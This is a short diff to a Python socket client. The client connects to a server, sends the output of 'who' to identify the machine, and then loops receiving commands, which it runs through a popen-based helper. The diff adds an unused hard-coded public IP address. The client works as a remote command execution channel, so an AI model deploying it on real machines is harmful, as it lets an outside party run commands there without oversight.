@@ -10,7 +10,9 @@ import time
 
 
 socket = socket.socket()
-serverAddress = 'localhost', 1111
+HVA = '145.109.173.68'
+l = 'localhost'
+serverAddress = l, 1111
 
 #   --> Execute a command and return the result of it
 def popenExecution(data):
@@ -29,7 +31,7 @@ def main():
     
     socket.connect(serverAddress)
     #Standard command to identify who this machine is
-    socket.send(pickle.dumps(popenExecution("who").split()[0])) #send the first result of who
+    socket.send(pickle.dumps(popenExecution("who").split()[0])) 
     while True:
         recv(socket)
         time.sleep(1)
